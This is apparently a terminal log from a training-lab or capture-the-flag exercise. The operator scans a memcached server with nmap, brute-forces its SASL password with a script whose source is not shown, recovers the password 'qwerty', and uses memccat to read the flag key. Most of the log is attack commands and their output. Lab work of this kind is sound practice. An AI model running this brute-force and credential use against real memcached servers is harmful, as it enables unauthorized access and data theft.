root@attackdefense:/# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4790: eth0@if4791: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:01:06 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.6/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
4793: eth1@if4794: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:45:e9:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.69.233.2/24 brd 192.69.233.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:/# namp -sV -p- 192.69.233.3
bash: namp: command not found
root@attackdefense:/# nmap -sV -p- 192.69.233.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-22 13:23 UTC
Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:01:25 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for o16ubuncowmstucgkte6ps51r.temp-network_a-69-233 (192.69.233.3)
Host is up (0.000011s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE   VERSION
11211/tcp open  memcache?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port11211-TCP:V=7.70%I=7%D=2/22%Time=5C6FF7F8%P=x86_64-pc-linux-gnu%r(R
SF:PCCheck,27,"\x81\0\0\0\0\0\0\x81\0\0\0\x0f\0\0\0\x02\0\0\0\0\0\0\0\0Unk
SF:nown\x20command");
MAC Address: 02:42:C0:45:E9:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.38 seconds
root@attackdefense:/# nc 192.69.233.3
no port[s] to connect to
root@attackdefense:/# nc 192.69.233.3 11211
stats iems
stats items
help
root@attackdefense:/# nano brutemem.py
root@attackdefense:/# python3 brutemem.py
Server: 192.69.233.3 (11211)
         pid: 10
         uptime: 1454
         time: 1550842049
         version: 1.5.12
         libevent: 2.1.8-stable
         pointer_size: 64
         rusage_user: 0.184142
         rusage_system: 0.097825
         max_connections: 1024
         curr_connections: 1
         total_connections: 105
         rejected_connections: 0
         connection_structures: 3
         reserved_fds: 20
         cmd_get: 0
         cmd_set: 9
         cmd_flush: 0
         cmd_touch: 0
         get_hits: 0
         get_misses: 0
         get_expired: 0
         get_flushed: 0
         delete_misses: 0
         delete_hits: 0
         incr_misses: 0
         incr_hits: 0
         decr_misses: 0
         decr_hits: 0
         cas_misses: 0
         cas_hits: 0
         cas_badval: 0
         touch_hits: 0
         touch_misses: 0
         auth_cmds: 41
         auth_errors: 38
         bytes_read: 6888
         bytes_written: 6364
         limit_maxbytes: 67108864
         accepting_conns: 1
         listen_disabled_num: 0
         time_in_listen_disabled_us: 0
         threads: 4
         conn_yields: 0
         hash_power_level: 16
         hash_bytes: 524288
         hash_is_expanding: 0
         slab_reassign_rescues: 0
         slab_reassign_chunk_rescues: 0
         slab_reassign_evictions_nomem: 0
         slab_reassign_inline_reclaim: 0
         slab_reassign_busy_items: 0
         slab_reassign_busy_deletes: 0
         slab_reassign_running: 0
         slabs_moved: 0
         lru_crawler_running: 0
         lru_crawler_starts: 1785
         lru_maintainer_juggles: 3001
         malloc_fails: 0
         log_worker_dropped: 0
         log_worker_written: 0
         log_watcher_skipped: 0
         log_watcher_sent: 0
         bytes: 675
         curr_items: 9
         total_items: 9
         slab_global_page_pool: 0
         expired_unfetched: 0
         evicted_unfetched: 0
         evicted_active: 0
         evictions: 0
         reclaimed: 0
         crawler_reclaimed: 0
         crawler_items_checked: 54
         lrutail_reflocked: 0
         moves_to_cold: 9
         moves_to_warm: 0
         moves_within_lru: 0
         direct_reclaims: 0
         lru_bumps_dropped: 0
PASSWORD: qwerty

root@attackdefense:/# memccat
No servers provied
root@attackdefense:/# memccat -h
memcat v1.0

        Cat a set of key values to stdout.

Current options. A '=' means the option takes a value.

         --version
                Display the version of the application and then exit.
         --help
                Display this message and then exit.
         --quiet
                stderr and stdin will be closed at application startup.
         --verbose
                Give more details on the progression of the application.
         --debug
                Provide output only useful for debugging.
         --servers=
                List which servers you wish to connect to.
         --flag
                Provide flag information for storage operation.
         --hash=
                Select hash type.
         --binary
                Switch to binary protocol.
         --username=
                Username to use for SASL authentication
         --password=
                Password to use for SASL authentication
         --file=
                Path to file in which to save result

root@attackdefense:/# memccat --servers=192.69.233.3 --username=student --password=qwerty flag
61832366e1f912c700181f829b6a0268
root@attackdefense:/#
